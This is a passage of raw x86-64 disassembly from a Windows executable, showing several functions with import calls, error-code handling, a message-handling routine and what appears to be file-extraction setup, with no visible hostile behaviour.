   14000481c:	e8 b7 1b 00 00       	call   0x1400063d8
   140004821:	48 8b 0d 48 a9 00 00 	mov    0xa948(%rip),%rcx        # 0x14000f170
   140004828:	48 ff 15 29 6b 00 00 	rex.W call *0x6b29(%rip)        # 0x14000b358
   14000482f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004834:	c7 05 46 ae 00 00 14 	movl   $0x80070714,0xae46(%rip)        # 0x14000f684
   14000483b:	07 07 80 
   14000483e:	eb a6                	jmp    0x1400047e6
   140004840:	48 8b 0d 29 a9 00 00 	mov    0xa929(%rip),%rcx        # 0x14000f170
   140004847:	48 8d 15 82 72 00 00 	lea    0x7282(%rip),%rdx        # 0x14000bad0
   14000484e:	48 ff 15 73 6b 00 00 	rex.W call *0x6b73(%rip)        # 0x14000b3c8
   140004855:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000485a:	85 c0                	test   %eax,%eax
   14000485c:	74 4a                	je     0x1400048a8
   14000485e:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140004864:	4c 8d 0d e5 19 00 00 	lea    0x19e5(%rip),%r9        # 0x140006250
   14000486b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004871:	45 33 c0             	xor    %r8d,%r8d
   140004874:	ba d1 07 00 00       	mov    $0x7d1,%edx
   140004879:	e8 22 1e 00 00       	call   0x1400066a0
   14000487e:	48 8b 0d eb a8 00 00 	mov    0xa8eb(%rip),%rcx        # 0x14000f170
   140004885:	48 8b d8             	mov    %rax,%rbx
   140004888:	48 ff 15 c9 6a 00 00 	rex.W call *0x6ac9(%rip)        # 0x14000b358
   14000488f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004894:	48 85 db             	test   %rbx,%rbx
   140004897:	75 22                	jne    0x1400048bb
   140004899:	c7 05 e1 ad 00 00 c7 	movl   $0x800704c7,0xade1(%rip)        # 0x14000f684
   1400048a0:	04 07 80 
   1400048a3:	e9 3e ff ff ff       	jmp    0x1400047e6
   1400048a8:	48 8b 0d c1 a8 00 00 	mov    0xa8c1(%rip),%rcx        # 0x14000f170
   1400048af:	48 ff 15 a2 6a 00 00 	rex.W call *0x6aa2(%rip)        # 0x14000b358
   1400048b6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400048bb:	83 25 c2 ad 00 00 00 	andl   $0x0,0xadc2(%rip)        # 0x14000f684
   1400048c2:	b8 01 00 00 00       	mov    $0x1,%eax
   1400048c7:	48 83 c4 30          	add    $0x30,%rsp
   1400048cb:	5b                   	pop    %rbx
   1400048cc:	c3                   	ret
   1400048cd:	cc                   	int3
   1400048ce:	cc                   	int3
   1400048cf:	cc                   	int3
   1400048d0:	cc                   	int3
   1400048d1:	cc                   	int3
   1400048d2:	cc                   	int3
   1400048d3:	cc                   	int3
   1400048d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400048d9:	57                   	push   %rdi
   1400048da:	48 81 ec 60 02 00 00 	sub    $0x260,%rsp
   1400048e1:	48 8b 05 98 97 00 00 	mov    0x9798(%rip),%rax        # 0x14000e080
   1400048e8:	48 33 c4             	xor    %rsp,%rax
   1400048eb:	48 89 84 24 50 02 00 	mov    %rax,0x250(%rsp)
   1400048f2:	00 
   1400048f3:	33 ff                	xor    %edi,%edi
   1400048f5:	66 39 3d 5c a5 00 00 	cmp    %di,0xa55c(%rip)        # 0x14000ee58
   1400048fc:	75 2b                	jne    0x140004929
   1400048fe:	39 3d 40 a5 00 00    	cmp    %edi,0xa540(%rip)        # 0x14000ee44
   140004904:	75 16                	jne    0x14000491c
   140004906:	e8 b9 0f 00 00       	call   0x1400058c4
   14000490b:	85 c0                	test   %eax,%eax
   14000490d:	0f 84 0a 01 00 00    	je     0x140004a1d
   140004913:	66 39 3d 3e a5 00 00 	cmp    %di,0xa53e(%rip)        # 0x14000ee58
   14000491a:	75 0d                	jne    0x140004929
   14000491c:	e8 63 fe ff ff       	call   0x140004784
   140004921:	85 c0                	test   %eax,%eax
   140004923:	0f 84 f4 00 00 00    	je     0x140004a1d
   140004929:	e8 f6 07 00 00       	call   0x140005124
   14000492e:	85 c0                	test   %eax,%eax
   140004930:	0f 84 e7 00 00 00    	je     0x140004a1d
   140004936:	e8 ed 0a 00 00       	call   0x140005428
   14000493b:	85 c0                	test   %eax,%eax
   14000493d:	0f 84 da 00 00 00    	je     0x140004a1d
   140004943:	bb 05 01 00 00       	mov    $0x105,%ebx
   140004948:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000494d:	8b d3                	mov    %ebx,%edx
   14000494f:	48 ff 15 a2 69 00 00 	rex.W call *0x69a2(%rip)        # 0x14000b2f8
   140004956:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000495b:	4c 8d 05 d6 6e 00 00 	lea    0x6ed6(%rip),%r8        # 0x14000b838
   140004962:	8b d3                	mov    %ebx,%edx
   140004964:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004969:	e8 6e 4c 00 00       	call   0x1400095dc
   14000496e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004973:	48 ff 15 86 69 00 00 	rex.W call *0x6986(%rip)        # 0x14000b300
   14000497a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000497f:	48 8b d8             	mov    %rax,%rbx
   140004982:	48 85 c0             	test   %rax,%rax
   140004985:	74 29                	je     0x1400049b0
   140004987:	48 8d 15 2a 71 00 00 	lea    0x712a(%rip),%rdx        # 0x14000bab8
   14000498e:	48 8b c8             	mov    %rax,%rcx
   140004991:	48 ff 15 b0 69 00 00 	rex.W call *0x69b0(%rip)        # 0x14000b348
   140004998:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000499d:	48 85 c0             	test   %rax,%rax
   1400049a0:	74 0e                	je     0x1400049b0
   1400049a2:	33 d2                	xor    %edx,%edx
   1400049a4:	48 8d 0d a5 ad 00 00 	lea    0xada5(%rip),%rcx        # 0x14000f750
   1400049ab:	e8 60 56 00 00       	call   0x14000a010
   1400049b0:	48 8b cb             	mov    %rbx,%rcx
   1400049b3:	48 ff 15 ae 69 00 00 	rex.W call *0x69ae(%rip)        # 0x14000b368
   1400049ba:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400049bf:	39 3d 7f a4 00 00    	cmp    %edi,0xa47f(%rip)        # 0x14000ee44
   1400049c5:	0f 85 8f 00 00 00    	jne    0x140004a5a
   1400049cb:	39 3d cf b5 00 00    	cmp    %edi,0xb5cf(%rip)        # 0x14000ffa0
   1400049d1:	0f 85 83 00 00 00    	jne    0x140004a5a
   1400049d7:	ba 04 01 00 00       	mov    $0x104,%edx
   1400049dc:	48 8d 8c 24 40 01 00 	lea    0x140(%rsp),%rcx
   1400049e3:	00 
   1400049e4:	48 ff 15 4d 69 00 00 	rex.W call *0x694d(%rip)        # 0x14000b338
   1400049eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400049f0:	85 c0                	test   %eax,%eax
   1400049f2:	75 4d                	jne    0x140004a41
   1400049f4:	ba f0 04 00 00       	mov    $0x4f0,%edx
   1400049f9:	45 33 c9             	xor    %r9d,%r9d
   1400049fc:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140004a00:	45 33 c0             	xor    %r8d,%r8d
   140004a03:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004a0a:	00 
   140004a0b:	33 c9                	xor    %ecx,%ecx
   140004a0d:	e8 c6 19 00 00       	call   0x1400063d8
   140004a12:	e8 69 1d 00 00       	call   0x140006780
   140004a17:	89 05 67 ac 00 00    	mov    %eax,0xac67(%rip)        # 0x14000f684
   140004a1d:	33 c0                	xor    %eax,%eax
   140004a1f:	48 8b 8c 24 50 02 00 	mov    0x250(%rsp),%rcx
   140004a26:	00 
   140004a27:	48 33 cc             	xor    %rsp,%rcx
   140004a2a:	e8 81 51 00 00       	call   0x140009bb0
   140004a2f:	48 8b 9c 24 70 02 00 	mov    0x270(%rsp),%rbx
   140004a36:	00 
   140004a37:	48 81 c4 60 02 00 00 	add    $0x260,%rsp
   140004a3e:	5f                   	pop    %rdi
   140004a3f:	c3                   	ret
   140004a40:	cc                   	int3
   140004a41:	ba 02 00 00 00       	mov    $0x2,%edx
   140004a46:	48 8d 8c 24 40 01 00 	lea    0x140(%rsp),%rcx
   140004a4d:	00 
   140004a4e:	44 8b c2             	mov    %edx,%r8d
   140004a51:	e8 f6 12 00 00       	call   0x140005d4c
   140004a56:	85 c0                	test   %eax,%eax
   140004a58:	74 c3                	je     0x140004a1d
   140004a5a:	48 8d 0d ef ac 00 00 	lea    0xacef(%rip),%rcx        # 0x14000f750
   140004a61:	48 ff 15 a8 69 00 00 	rex.W call *0x69a8(%rip)        # 0x14000b410
   140004a68:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004a6d:	85 c0                	test   %eax,%eax
   140004a6f:	75 07                	jne    0x140004a78
   140004a71:	ba bc 04 00 00       	mov    $0x4bc,%edx
   140004a76:	eb 81                	jmp    0x1400049f9
   140004a78:	39 3d ce a3 00 00    	cmp    %edi,0xa3ce(%rip)        # 0x14000ee4c
   140004a7e:	75 78                	jne    0x140004af8
   140004a80:	48 8d 05 f9 a6 00 00 	lea    0xa6f9(%rip),%rax        # 0x14000f180
   140004a87:	b9 28 00 00 00       	mov    $0x28,%ecx
   140004a8c:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140004a92:	48 8d 40 20          	lea    0x20(%rax),%rax
   140004a96:	48 83 e9 01          	sub    $0x1,%rcx
   140004a9a:	75 f0                	jne    0x140004a8c
   140004a9c:	f6 05 b5 a3 00 00 01 	testb  $0x1,0xa3b5(%rip)        # 0x14000ee58
   140004aa3:	75 6f                	jne    0x140004b14
   140004aa5:	f6 05 f8 b4 00 00 01 	testb  $0x1,0xb4f8(%rip)        # 0x14000ffa4
   140004aac:	75 66                	jne    0x140004b14
   140004aae:	8b 05 a8 97 00 00    	mov    0x97a8(%rip),%eax        # 0x14000e25c
   140004ab4:	4c 8d 0d c5 00 00 00 	lea    0xc5(%rip),%r9        # 0x140004b80
   140004abb:	f7 d8                	neg    %eax
   140004abd:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140004ac2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004ac7:	48 1b d2             	sbb    %rdx,%rdx
   140004aca:	45 33 c0             	xor    %r8d,%r8d
   140004acd:	48 81 c2 d5 07 00 00 	add    $0x7d5,%rdx
   140004ad4:	e8 c7 1b 00 00       	call   0x1400066a0
   140004ad9:	48 85 c0             	test   %rax,%rax
   140004adc:	74 3f                	je     0x140004b1d
   140004ade:	48 8d 0d eb 25 00 00 	lea    0x25eb(%rip),%rcx        # 0x1400070d0
   140004ae5:	e8 7e 33 00 00       	call   0x140007e68
   140004aea:	85 c0                	test   %eax,%eax
   140004aec:	0f 84 2b ff ff ff    	je     0x140004a1d
   140004af2:	89 3d 8c ab 00 00    	mov    %edi,0xab8c(%rip)        # 0x14000f684
   140004af8:	8b 05 6a a6 00 00    	mov    0xa66a(%rip),%eax        # 0x14000f168
   140004afe:	a8 40                	test   $0x40,%al
   140004b00:	75 2a                	jne    0x140004b2c
   140004b02:	84 c0                	test   %al,%al
   140004b04:	78 26                	js     0x140004b2c
   140004b06:	0f b7 0d ab b4 00 00 	movzwl 0xb4ab(%rip),%ecx        # 0x14000ffb8
   140004b0d:	e8 a2 eb ff ff       	call   0x1400036b4
   140004b12:	eb 1a                	jmp    0x140004b2e
   140004b14:	e8 97 02 00 00       	call   0x140004db0
   140004b19:	85 c0                	test   %eax,%eax
   140004b1b:	75 c1                	jne    0x140004ade
   140004b1d:	c7 05 5d ab 00 00 2b 	movl   $0x8007042b,0xab5d(%rip)        # 0x14000f684
   140004b24:	04 07 80 
   140004b27:	e9 f1 fe ff ff       	jmp    0x140004a1d
   140004b2c:	8b c7                	mov    %edi,%eax
   140004b2e:	89 05 88 b4 00 00    	mov    %eax,0xb488(%rip)        # 0x14000ffbc
   140004b34:	8b 05 0a a3 00 00    	mov    0xa30a(%rip),%eax        # 0x14000ee44
   140004b3a:	85 c0                	test   %eax,%eax
   140004b3c:	75 1b                	jne    0x140004b59
   140004b3e:	39 3d 5c b4 00 00    	cmp    %edi,0xb45c(%rip)        # 0x14000ffa0
   140004b44:	75 13                	jne    0x140004b59
   140004b46:	e8 61 29 00 00       	call   0x1400074ac
   140004b4b:	85 c0                	test   %eax,%eax
   140004b4d:	0f 84 ca fe ff ff    	je     0x140004a1d
   140004b53:	8b 05 eb a2 00 00    	mov    0xa2eb(%rip),%eax        # 0x14000ee44
   140004b59:	66 39 3d f8 a2 00 00 	cmp    %di,0xa2f8(%rip)        # 0x14000ee58
   140004b60:	75 09                	jne    0x140004b6b
   140004b62:	85 c0                	test   %eax,%eax
   140004b64:	75 05                	jne    0x140004b6b
   140004b66:	e8 d5 04 00 00       	call   0x140005040
   140004b6b:	b8 01 00 00 00       	mov    $0x1,%eax
   140004b70:	e9 aa fe ff ff       	jmp    0x140004a1f
   140004b75:	cc                   	int3
   140004b76:	cc                   	int3
   140004b77:	cc                   	int3
   140004b78:	cc                   	int3
   140004b79:	cc                   	int3
   140004b7a:	cc                   	int3
   140004b7b:	cc                   	int3
   140004b7c:	cc                   	int3
   140004b7d:	cc                   	int3
   140004b7e:	cc                   	int3
   140004b7f:	cc                   	int3
   140004b80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b85:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004b8a:	57                   	push   %rdi
   140004b8b:	48 83 ec 30          	sub    $0x30,%rsp
   140004b8f:	49 8b f0             	mov    %r8,%rsi
   140004b92:	48 8b f9             	mov    %rcx,%rdi
   140004b95:	bb 01 00 00 00       	mov    $0x1,%ebx
   140004b9a:	83 ea 10             	sub    $0x10,%edx
   140004b9d:	0f 84 df 01 00 00    	je     0x140004d82
   140004ba3:	81 ea f2 00 00 00    	sub    $0xf2,%edx
   140004ba9:	0f 84 cd 01 00 00    	je     0x140004d7c
   140004baf:	83 ea 0e             	sub    $0xe,%edx
   140004bb2:	0f 84 c9 00 00 00    	je     0x140004c81
   140004bb8:	2b d3                	sub    %ebx,%edx
   140004bba:	74 2f                	je     0x140004beb
   140004bbc:	81 fa 90 0e 00 00    	cmp    $0xe90,%edx
   140004bc2:	74 07                	je     0x140004bcb
   140004bc4:	33 c0                	xor    %eax,%eax
   140004bc6:	e9 ce 01 00 00       	jmp    0x140004d99
   140004bcb:	48 8b 0d c6 9f 00 00 	mov    0x9fc6(%rip),%rcx        # 0x14000eb98
   140004bd2:	33 d2                	xor    %edx,%edx
   140004bd4:	48 ff 15 5d 68 00 00 	rex.W call *0x685d(%rip)        # 0x14000b438
   140004bdb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004be0:	48 63 d6             	movslq %esi,%rdx
   140004be3:	48 8b cf             	mov    %rdi,%rcx
   140004be6:	e9 9f 01 00 00       	jmp    0x140004d8a
   140004beb:	48 83 fe 02          	cmp    $0x2,%rsi
   140004bef:	0f 85 a1 01 00 00    	jne    0x140004d96
   140004bf5:	48 8b 0d 34 9d 00 00 	mov    0x9d34(%rip),%rcx        # 0x14000e930
   140004bfc:	48 ff 15 5d 68 00 00 	rex.W call *0x685d(%rip)        # 0x14000b460
   140004c03:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c08:	48 8b 0d d9 9c 00 00 	mov    0x9cd9(%rip),%rcx        # 0x14000e8e8
   140004c0f:	4c 8d 05 1a 6c 00 00 	lea    0x6c1a(%rip),%r8        # 0x14000b830
   140004c16:	45 33 c9             	xor    %r9d,%r9d
   140004c19:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140004c20:	00 
   140004c21:	ba b2 04 00 00       	mov    $0x4b2,%edx
   140004c26:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   140004c2d:	00 
   140004c2e:	e8 a5 17 00 00       	call   0x1400063d8
   140004c33:	83 f8 06             	cmp    $0x6,%eax
   140004c36:	74 1c                	je     0x140004c54
   140004c38:	3b c3                	cmp    %ebx,%eax
   140004c3a:	74 18                	je     0x140004c54
   140004c3c:	48 8b 0d ed 9c 00 00 	mov    0x9ced(%rip),%rcx        # 0x14000e930
   140004c43:	48 ff 15 e6 67 00 00 	rex.W call *0x67e6(%rip)        # 0x14000b430
   140004c4a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c4f:	e9 42 01 00 00       	jmp    0x140004d96
   140004c54:	48 8b 0d d5 9c 00 00 	mov    0x9cd5(%rip),%rcx        # 0x14000e930
   140004c5b:	89 1d db aa 00 00    	mov    %ebx,0xaadb(%rip)        # 0x14000f73c
   140004c61:	48 ff 15 c8 67 00 00 	rex.W call *0x67c8(%rip)        # 0x14000b430
   140004c68:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c6d:	48 8b 0d 24 9f 00 00 	mov    0x9f24(%rip),%rcx        # 0x14000eb98
   140004c74:	e8 8f 35 00 00       	call   0x140008208
   140004c79:	48 8b cf             	mov    %rdi,%rcx
   140004c7c:	e9 07 01 00 00       	jmp    0x140004d88
   140004c81:	48 89 3d 60 9c 00 00 	mov    %rdi,0x9c60(%rip)        # 0x14000e8e8
   140004c88:	48 ff 15 31 69 00 00 	rex.W call *0x6931(%rip)        # 0x14000b5c0
   140004c8f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c94:	48 8b d0             	mov    %rax,%rdx
   140004c97:	48 8b cf             	mov    %rdi,%rcx
   140004c9a:	e8 89 f1 ff ff       	call   0x140003e28
   140004c9f:	83 3d b6 95 00 00 00 	cmpl   $0x0,0x95b6(%rip)        # 0x14000e25c
   140004ca6:	74 63                	je     0x140004d0b
   140004ca8:	be 3b 08 00 00       	mov    $0x83b,%esi
   140004cad:	48 8b cf             	mov    %rdi,%rcx
   140004cb0:	8b d6                	mov    %esi,%edx
   140004cb2:	48 ff 15 7f 69 00 00 	rex.W call *0x697f(%rip)        # 0x14000b638
   140004cb9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004cbe:	41 b9 b9 0b 00 00    	mov    $0xbb9,%r9d
   140004cc4:	45 33 c0             	xor    %r8d,%r8d
   140004cc7:	48 8b c8             	mov    %rax,%rcx
   140004cca:	ba 64 04 00 00       	mov    $0x464,%edx
   140004ccf:	48 ff 15 6a 69 00 00 	rex.W call *0x696a(%rip)        # 0x14000b640
   140004cd6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004cdb:	8b d6                	mov    %esi,%edx
   140004cdd:	48 8b cf             	mov    %rdi,%rcx
   140004ce0:	48 ff 15 51 69 00 00 	rex.W call *0x6951(%rip)        # 0x14000b638
   140004ce7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004cec:	49 c7 c1 00 00 ff ff 	mov    $0xffffffffffff0000,%r9
   140004cf3:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   140004cf7:	48 8b c8             	mov    %rax,%rcx
   140004cfa:	ba 65 04 00 00       	mov    $0x465,%edx
   140004cff:	48 ff 15 3a 69 00 00 	rex.W call *0x693a(%rip)        # 0x14000b640
   140004d06:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d0b:	48 8d 15 a6 a9 00 00 	lea    0xa9a6(%rip),%rdx        # 0x14000f6b8
   140004d12:	48 8b cf             	mov    %rdi,%rcx
   140004d15:	48 ff 15 3c 69 00 00 	rex.W call *0x693c(%rip)        # 0x14000b658
   140004d1c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d21:	48 8d 05 68 9e 00 00 	lea    0x9e68(%rip),%rax        # 0x14000eb90
   140004d28:	45 33 c9             	xor    %r9d,%r9d
   140004d2b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004d30:	4c 8d 05 79 00 00 00 	lea    0x79(%rip),%r8        # 0x140004db0
   140004d37:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   140004d3c:	33 d2                	xor    %edx,%edx
   140004d3e:	33 c9                	xor    %ecx,%ecx
   140004d40:	48 ff 15 11 67 00 00 	rex.W call *0x6711(%rip)        # 0x14000b458
   140004d47:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d4c:	48 89 05 45 9e 00 00 	mov    %rax,0x9e45(%rip)        # 0x14000eb98
   140004d53:	48 85 c0             	test   %rax,%rax
   140004d56:	75 3e                	jne    0x140004d96
   140004d58:	21 44 24 28          	and    %eax,0x28(%rsp)
   140004d5c:	45 33 c9             	xor    %r9d,%r9d
   140004d5f:	45 33 c0             	xor    %r8d,%r8d
   140004d62:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004d69:	00 
   140004d6a:	ba b8 04 00 00       	mov    $0x4b8,%edx
   140004d6f:	48 8b cf             	mov    %rdi,%rcx
   140004d72:	e8 61 16 00 00       	call   0x1400063d8
   140004d77:	e9 fd fe ff ff       	jmp    0x140004c79
   140004d7c:	48 83 fe 1b          	cmp    $0x1b,%rsi
   140004d80:	75 14                	jne    0x140004d96
   140004d82:	89 1d b4 a9 00 00    	mov    %ebx,0xa9b4(%rip)        # 0x14000f73c
   140004d88:	33 d2                	xor    %edx,%edx
   140004d8a:	48 ff 15 57 68 00 00 	rex.W call *0x6857(%rip)        # 0x14000b5e8
   140004d91:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d96:	48 8b c3             	mov    %rbx,%rax
   140004d99:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004d9e:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140004da3:	48 83 c4 30          	add    $0x30,%rsp
   140004da7:	5f                   	pop    %rdi
   140004da8:	c3                   	ret
   140004da9:	cc                   	int3
   140004daa:	cc                   	int3
   140004dab:	cc                   	int3
   140004dac:	cc                   	int3
   140004dad:	cc                   	int3
   140004dae:	cc                   	int3
   140004daf:	cc                   	int3
   140004db0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004db5:	57                   	push   %rdi
   140004db6:	48 83 ec 50          	sub    $0x50,%rsp
   140004dba:	45 33 c0             	xor    %r8d,%r8d
   140004dbd:	48 8d 0d b4 6d 00 00 	lea    0x6db4(%rip),%rcx        # 0x14000bb78
   140004dc4:	33 d2                	xor    %edx,%edx
   140004dc6:	e8 81 05 00 00       	call   0x14000534c
   140004dcb:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140004dd1:	89 05 d1 a8 00 00    	mov    %eax,0xa8d1(%rip)        # 0x14000f6a8
   140004dd7:	48 8d 15 9a 6d 00 00 	lea    0x6d9a(%rip),%rdx        # 0x14000bb78
   140004dde:	33 c9                	xor    %ecx,%ecx
   140004de0:	48 ff 15 f1 65 00 00 	rex.W call *0x65f1(%rip)        # 0x14000b3d8
   140004de7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004dec:	48 8b d0             	mov    %rax,%rdx
   140004def:	33 c9                	xor    %ecx,%ecx
   140004df1:	48 ff 15 70 66 00 00 	rex.W call *0x6670(%rip)        # 0x14000b468
   140004df8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004dfd:	48 8b c8             	mov    %rax,%rcx
   140004e00:	48 ff 15 41 66 00 00 	rex.W call *0x6641(%rip)        # 0x14000b448
   140004e07:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e0c:	48 89 05 8d a8 00 00 	mov    %rax,0xa88d(%rip)        # 0x14000f6a0
   140004e13:	48 85 c0             	test   %rax,%rax
   140004e16:	0f 84 d5 01 00 00    	je     0x140004ff1
   140004e1c:	48 8b 0d c5 9a 00 00 	mov    0x9ac5(%rip),%rcx        # 0x14000e8e8
   140004e23:	48 85 c9             	test   %rcx,%rcx
   140004e26:	74 4e                	je     0x140004e76
   140004e28:	ba 42 08 00 00       	mov    $0x842,%edx
   140004e2d:	48 ff 15 04 68 00 00 	rex.W call *0x6804(%rip)        # 0x14000b638
   140004e34:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e39:	48 8b c8             	mov    %rax,%rcx
   140004e3c:	33 d2                	xor    %edx,%edx
   140004e3e:	48 ff 15 6b 67 00 00 	rex.W call *0x676b(%rip)        # 0x14000b5b0
   140004e45:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e4a:	48 8b 0d 97 9a 00 00 	mov    0x9a97(%rip),%rcx        # 0x14000e8e8
   140004e51:	ba 41 08 00 00       	mov    $0x841,%edx
   140004e56:	48 ff 15 db 67 00 00 	rex.W call *0x67db(%rip)        # 0x14000b638
   140004e5d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e62:	48 8b c8             	mov    %rax,%rcx
   140004e65:	ba 05 00 00 00       	mov    $0x5,%edx
   140004e6a:	48 ff 15 3f 67 00 00 	rex.W call *0x673f(%rip)        # 0x14000b5b0
   140004e71:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e76:	e8 55 32 00 00       	call   0x1400080d0
   140004e7b:	85 c0                	test   %eax,%eax
   140004e7d:	75 0a                	jne    0x140004e89
   140004e7f:	ba ba 04 00 00       	mov    $0x4ba,%edx
   140004e84:	e9 cb 00 00 00       	jmp    0x140004f54
   140004e89:	48 8d 05 1c a8 00 00 	lea    0xa81c(%rip),%rax        # 0x14000f6ac
   140004e90:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004e95:	4c 8d 0d f4 3b 00 00 	lea    0x3bf4(%rip),%r9        # 0x140008a90
   140004e9c:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140004ea3:	00 
   140004ea4:	48 8d 05 95 3c 00 00 	lea    0x3c95(%rip),%rax        # 0x140008b40
   140004eab:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004eb0:	4c 8d 05 79 39 00 00 	lea    0x3979(%rip),%r8        # 0x140008830
   140004eb7:	48 8d 05 c2 36 00 00 	lea    0x36c2(%rip),%rax        # 0x140008580
   140004ebe:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004ec3:	48 8d 15 46 39 00 00 	lea    0x3946(%rip),%rdx        # 0x140008810
   140004eca:	48 8d 05 2f 46 00 00 	lea    0x462f(%rip),%rax        # 0x140009500
   140004ed1:	48 8d 0d 88 36 00 00 	lea    0x3688(%rip),%rcx        # 0x140008560
   140004ed8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004edd:	48 ff 15 b4 63 00 00 	rex.W call *0x63b4(%rip)        # 0x14000b298
   140004ee4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004ee9:	48 8b f8             	mov    %rax,%rdi
   140004eec:	48 85 c0             	test   %rax,%rax
   140004eef:	74 57                	je     0x140004f48
   140004ef1:	48 8d 05 a8 a7 00 00 	lea    0xa7a8(%rip),%rax        # 0x14000f6a0
   140004ef8:	45 33 c9             	xor    %r9d,%r9d
   140004efb:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004f00:	4c 8d 05 29 69 00 00 	lea    0x6929(%rip),%r8        # 0x14000b830
   140004f07:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140004f0d:	48 8d 05 dc 36 00 00 	lea    0x36dc(%rip),%rax        # 0x1400085f0
   140004f14:	48 8d 15 95 93 00 00 	lea    0x9395(%rip),%rdx        # 0x14000e2b0
   140004f1b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004f20:	48 8b cf             	mov    %rdi,%rcx
   140004f23:	48 ff 15 7e 63 00 00 	rex.W call *0x637e(%rip)        # 0x14000b2a8
   140004f2a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004f2f:	8b d8                	mov    %eax,%ebx
   140004f31:	85 c0                	test   %eax,%eax
   140004f33:	74 40                	je     0x140004f75
   140004f35:	48 8b cf             	mov    %rdi,%rcx
   140004f38:	48 ff 15 61 63 00 00 	rex.W call *0x6361(%rip)        # 0x14000b2a0
   140004f3f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004f44:	85 c0                	test   %eax,%eax
   140004f46:	75 2d                	jne    0x140004f75
   140004f48:	8b 15 5e a7 00 00    	mov    0xa75e(%rip),%edx        # 0x14000f6ac
   140004f4e:	81 c2 14 05 00 00    	add    $0x514,%edx
   140004f54:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140004f59:	45 33 c9             	xor    %r9d,%r9d
   140004f5c:	48 8b 0d 85 99 00 00 	mov    0x9985(%rip),%rcx        # 0x14000e8e8
   140004f63:	45 33 c0             	xor    %r8d,%r8d
   140004f66:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004f6d:	00 
   140004f6e:	e8 65 14 00 00       	call   0x1400063d8
   140004f73:	33 db                	xor    %ebx,%ebx
   140004f75:	48 8b 0d 24 a7 00 00 	mov    0xa724(%rip),%rcx        # 0x14000f6a0
   140004f7c:	48 85 c9             	test   %rcx,%rcx
   140004f7f:	74 14                	je     0x140004f95
   140004f81:	48 ff 15 78 64 00 00 	rex.W call *0x6478(%rip)        # 0x14000b400
   140004f88:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004f8d:	48 83 25 0b a7 00 00 	andq   $0x0,0xa70b(%rip)        # 0x14000f6a0
   140004f94:	00 
   140004f95:	85 db                	test   %ebx,%ebx
   140004f97:	75 26                	jne    0x140004fbf
